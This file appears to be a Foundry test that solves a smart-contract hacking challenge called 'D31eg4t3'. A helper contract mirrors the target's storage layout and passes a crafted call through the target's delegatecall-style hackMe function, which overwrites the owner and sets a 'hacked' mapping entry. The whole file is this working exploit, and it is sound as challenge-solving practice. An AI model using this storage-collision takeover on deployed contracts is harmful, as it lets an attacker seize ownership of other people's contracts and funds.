// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/D31eg4t3.sol";

contract D31eg4t3Solution is Test {

    //Become the owner of the contract
    //Change the value of hacked to true
    //0x01 deployer address
    //0x02 attacker address

    D31eg4t3 public target;
    Delegatee public delegatee;

    function setUp() public {
        
        target = new D31eg4t3();
        delegatee = new Delegatee();
    }

    function testSolution() public {
        vm.prank(address(0x05));

        delegatee.callBack(address(target), address(0x05));

        address newOwner = target.getOwner();
         console.log("new owner: ", newOwner);
         bool mappingAddr = target.getMapping(address(0x05));
         console.log(mappingAddr);
         console.log('success');
        }
}

contract Delegatee {

    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    D31eg4t3 public target;

    function callBack(address _targetAddr, address _myAddr) external {
        target = D31eg4t3(_targetAddr);
        //bytes calldata data = abi.encodeWithSignature("hacked()");
        (bool success, bytes memory retData) = target.hackMe(abi.encodeWithSignature("mutateStorage(address)", _myAddr));
        require(success, "call failed");
    }

    function mutateStorage(address _myAddr) external {
        owner = _myAddr;
        canYouHackMe[_myAddr] = true;
    }
}